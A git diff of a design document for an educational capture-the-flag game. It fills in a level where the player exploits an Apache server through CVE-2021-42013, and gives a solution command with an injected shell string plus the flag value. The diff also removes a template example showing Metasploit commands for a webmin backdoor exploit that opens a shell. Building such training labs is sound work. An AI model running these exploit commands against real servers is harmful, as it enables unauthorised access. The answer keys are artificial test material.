@@ -101,6 +101,7 @@ The task is to find the machine with a running web server. Use nmap and find a r
 ---
 
 **Task assignment**:
+
 You already got into the computer of Ms. Valeria and found some useful information about files stored on some server. 
 
 Your task is to find the machine with a running web server. Use some scanning tool and look for specific services running on specific ports.
@@ -153,18 +154,18 @@ The player learns how to scan the network to discover its structure and various 
 
 ## Level 4: Exploit the server
 
-**Objective** (*visible only to the designer, never to the player*):
+**Objective**:
 
 Use the exploit to get access to the servers filesystem and find the secret file in the folder from task 2. 
 
 ---
 ---
 
-**Task assignment** (*visible to the player*):
+**Task assignment**:
 
 You already got the IP address and the name of the service. Fortunately for you, the Apache servers tend to be vulnerable. After all, this is not your first time dealing with such a server. This means that you got a script ready to be used. It is located in your Downloads folder. Unfortunately, it was quite a long time ago, so you need to refresh your memory a bit. The important thing is that you do remember the name of the vulnerability. The name is [CVE-2021-42013]. Thanks to this, you will be able to find the file the name which you discovered from the deleted file on Valeria's computer. The flag itself is the last word in the file (consisting of two parts connected with -).
 
-**Hints** (*visible to the player if requested*):
+**Hints**:
 
 Hint 1 (Where to find more info?): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013
 
@@ -172,104 +173,31 @@ Hint 2 (Where is the Downloads folder?): /home/kali/Downloads
 
 Hint 3 (How to use multiple commands in one call?): Make use of quotes. For example "cd /articles/ && ls"
 
-**Solution** (*visible to the player if requested*):
+**Solution**:
 
 ```
 python3 cve-2021-42013.py -u http://192.168.1.4 -s "cd /articles/secret && cat new_information"
 ```
 
 
-**Flag value** (*visible to the player if they solve the level*):
+**Flag value**:
 
 `Gagarin-mk1`
 
 ---
 ---
 
-**Estimated duration** (*visible only to the designer, never to the player*):
+**Estimated duration**:
 
-[Number] minutes (for the average player to complete the level)
+15 minutes
 
-**Learning outcomes** (*visible only to the designer, never to the player*):
+**Learning outcomes**:
+
 Learn about vulnerabilities (CVE) and that you can exploit them easily.
 
 ---
 ---
 
-# Level template
-
-## Level X: [Title of the level]
-
-**Objective** (*visible only to the designer, never to the player*):
-
-One sentence about the goal of the level. Answers the question "What should the player achieve in the level?"
-
-The objective helps the designers and reviewers of the game design to gain a quick overview of the level.
-
-Example: Scan the server to discover its open ports.
-
----
----
-
-**Task assignment** (*visible to the player*):
-
-Here, briefly describe the text that the player will see as the assignment.
-
-This includes the description of the flag format.
-
-Example:
-You have acquired an IP address of a mysterious server: `172.18.1.5`. Scan it to find its open ports.
-As a flag, submit the highest number of an open port.
-
-**Hints** (*visible to the player if requested*):
-
-Write down one or more hints to help the player if (s)he gets stuck during the level.
-
-Each hint has a description and content.
-
-Format: Hint [Number] ([Description]): [Content]
-
-Example: Hint 1 (What tool to use?): Use the command-line tool **nmap**. Type `nmap --help` for more info.
-
-**Solution** (*visible to the player if requested*):
-
-A step-by-step description of the commands the player has to execute to complete the level.
-
-Example:
-```
-root@attacker:~#  msfconsole
-msf5 > search webmin
-msf5 > use exploit/unix/webapp/webmin_backdoor
-msf5 > show options
-msf5 > set RHOST 172.18.1.5
-msf5 > set LHOST 10.1.135.83
-msf5 > set RPORT 10000
-msf5 > check
-msf5 > exploit
-After this a new ssh session was created.
-cd /root/
-cat WARNING-READ-ME.txt
-The flag is 25790
-```
-
-**Flag value** (*visible to the player if they solve the level*):
-
-What should the player discover after successfully solving the level:
-
-[Sdilejte az to smazou!]
-
-Example: CVE-2019-15107
-
----
----
-
-**Estimated duration** (*visible only to the designer, never to the player*):
-
-[Number] minutes (for the average player to complete the level)
-
-**Learning outcomes** (*visible only to the designer, never to the player*):
-
 ## License
-***#TODO***
-This work by [your names] is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0).
+This work by team Foxtrot is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0).
 
